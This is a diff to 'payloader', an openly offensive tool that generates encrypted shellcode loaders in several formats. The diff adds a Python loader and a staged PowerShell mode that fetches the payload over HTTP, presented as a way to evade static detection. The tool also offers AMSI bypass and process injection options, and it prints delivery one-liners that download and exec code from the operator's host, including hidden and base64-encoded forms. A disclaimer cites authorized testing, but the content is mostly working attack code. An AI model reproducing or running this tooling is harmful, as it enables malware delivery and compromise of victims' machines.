@@ -2,7 +2,7 @@
 """
 payloader – Multi-format shellcode payload generator.
 
-Generates ready-to-use loaders in PowerShell, C#, VBA, ASPX, and raw binary
+Generates ready-to-use loaders in PowerShell, C#, VBA, ASPX, Python, and raw binary
 with support for XOR, AES-256-CBC, RC4, ROT-N, and multi-layer chaining.
 
 DISCLAIMER: For authorized security testing and educational use only.
@@ -33,6 +33,7 @@ from modules.generators import ps1 as gen_ps1
 from modules.generators import vba as gen_vba
 from modules.generators import cs as gen_cs
 from modules.generators import aspx as gen_aspx
+from modules.generators import py as gen_py
 from modules.generators import raw as gen_raw
 
 WEB_PORT = 80
@@ -112,7 +113,7 @@ ENCRYPTION:
                         Params within a stage separated by semicolons.
 
 OUTPUT FORMAT:
-    --output-format FMT Comma-separated list: ps1,cs,vba,aspx,bin
+    --output-format FMT Comma-separated list: ps1,cs,vba,aspx,py,bin
                         Default: ps1
     --injection-method  For C# output: valloc,pinject,ntinject,hollow
                         Default: valloc
@@ -126,6 +127,11 @@ POWERSHELL OPTIONS:
     --no-obfuscate      Disable PS obfuscation
     -d, --debug         Emit diagnostic Write-Host lines
     --bypass-amsi       Include AMSI bypass (default: always included)
+    --staged            PS loader becomes a small stager that downloads the
+                        encrypted blob over the web server (no embedded
+                        shellcode in the .ps1). A .bin with the encrypted
+                        payload is written alongside and must be served too.
+                        Strongly reduces static-detection surface.
 
 DONUT OPTIONS (for .exe/.dll files):
     -a, --arch ARCH     1=x86  2=amd64  3=x86+amd64 (default: 3)
@@ -147,6 +153,10 @@ EXAMPLES:
     # ROT-13 ASPX webshell payload
     python3 {name} shell.bin --encryption ROT --rot-n 13 --output-format aspx
 
+    # Python loader (AES-256-CBC, runs on Windows via ctypes)
+    python3 {name} shell.bin --encryption AES256 --key "MySecret" \\
+        --output-format py
+
     # Raw encrypted binary for custom loaders
     python3 {name} shell.bin --encryption RC4 --key 0xDEADBEEF --output-format bin
 
@@ -160,6 +170,10 @@ EXAMPLES:
 
     # Disable obfuscation for debugging
     python3 {name} shell.bin --no-obfuscate -d
+
+    # Staged PS loader (no embedded shellcode) - stager + served .bin
+    python3 {name} shell.bin --encryption AES256 --key "MySecret" \\
+        --output-format ps1 --staged
 
 VALIDATION:
     python3 tests/validate_chain.py --all
@@ -186,6 +200,7 @@ def parse_args(argv):
         'obfuscation_level': 3,
         'enable_obfuscation': True,
         'enable_debug': False,
+        'staged': False,
         'donut_arch': 3,
         'donut_bypass': 3,
         'donut_params': '',
@@ -230,6 +245,8 @@ def parse_args(argv):
             args['enable_obfuscation'] = True; i += 1; continue
         elif a == '--no-obfuscate':
             args['enable_obfuscation'] = False; i += 1; continue
+        elif a == '--staged':
+            args['staged'] = True; i += 1; continue
         elif a in ('-d', '--debug'):
             args['enable_debug'] = True; i += 1; continue
 
@@ -338,16 +355,32 @@ def main():
     for fmt in output_formats:
         try:
             if fmt == 'ps1':
-                print(f"\n[*] Generating PowerShell loader...")
-                out = gen_ps1.generate(
-                    encrypted_bytes, chain_metadata,
-                    obfuscation_level=args['obfuscation_level'],
-                    enable_obfuscation=args['enable_obfuscation'],
-                    enable_debug=args['enable_debug'],
-                )
-                fname = base_name + '.ps1'
-                write_output(out, fname)
-                outputs_generated.append(('ps1', fname))
+                if args['staged']:
+                    print(f"\n[*] Generating PowerShell stager (staged: payload fetched over HTTP)...")
+                    bin_fname = base_name + '.bin'
+                    url = f"http://{get_local_ip()}:{WEB_PORT}/{bin_fname}"
+                    out = gen_ps1.generate(
+                        encrypted_bytes, chain_metadata,
+                        obfuscation_level=args['obfuscation_level'],
+                        enable_obfuscation=args['enable_obfuscation'],
+                        enable_debug=args['enable_debug'],
+                        staged_url=url,
+                    )
+                    fname = base_name + '.ps1'
+                    write_output(out, fname)
+                    write_output(encrypted_bytes, bin_fname)
+                    outputs_generated.append(('ps1', fname))
+                else:
+                    print(f"\n[*] Generating PowerShell loader...")
+                    out = gen_ps1.generate(
+                        encrypted_bytes, chain_metadata,
+                        obfuscation_level=args['obfuscation_level'],
+                        enable_obfuscation=args['enable_obfuscation'],
+                        enable_debug=args['enable_debug'],
+                    )
+                    fname = base_name + '.ps1'
+                    write_output(out, fname)
+                    outputs_generated.append(('ps1', fname))
 
             elif fmt == 'vba':
                 print(f"\n[*] Generating VBA macro loader...")
@@ -374,6 +407,13 @@ def main():
                 write_output(out, fname)
                 outputs_generated.append(('aspx', fname))
 
+            elif fmt in ('py', 'python'):
+                print(f"\n[*] Generating Python loader...")
+                out = gen_py.generate(encrypted_bytes, chain_metadata)
+                fname = base_name + '.py'
+                write_output(out, fname)
+                outputs_generated.append(('py', fname))
+
             elif fmt == 'bin':
                 print(f"\n[*] Writing raw encrypted binary...")
                 out = gen_raw.generate(encrypted_bytes)
@@ -383,7 +423,7 @@ def main():
 
             else:
                 print(f"[!] Unknown output format: '{fmt}'. "
-                      "Valid: ps1, vba, cs, aspx, bin")
+                      "Valid: ps1, vba, cs, aspx, py, bin")
 
         except ValueError as e:
             print(f"[!] {fmt}: {e}")
@@ -431,6 +471,29 @@ def main():
         print(f"\n[STEP 3] Base64-encoded command:")
         print("-"*80)
         print(f"powershell -nop -w hidden -enc {enc}")
+        print("-"*80)
+
+    # ---- Python delivery commands --------------------------------------
+    py_outputs = [(fmt, fname) for fmt, fname in outputs_generated if fmt == 'py']
+    if py_outputs:
+        my_ip = get_local_ip()
+        fname = py_outputs[0][1]
+        print(f"\n[STEP 1] Start web server:")
+        print(f"   sudo python3 -m http.server {WEB_PORT}")
+
+        print(f"\n[STEP 2] Execute on target (direct):")
+        print("-"*80)
+        print(f'python -c "import urllib.request;'
+              f"exec(urllib.request.urlopen('http://{my_ip}:{WEB_PORT}/{fname}')"
+              f'.read())"')
+        print("-"*80)
+
+        cmd = (f"import urllib.request;"
+               f"exec(urllib.request.urlopen('http://{my_ip}:{WEB_PORT}/{fname}').read())")
+        enc = base64.b64encode(cmd.encode('utf-8')).decode()
+        print(f"\n[STEP 3] Base64-encoded command:")
+        print("-"*80)
+        print(f"python -c \"import base64;exec(base64.b64decode('{enc}'))\"")
         print("-"*80)
 
     print()
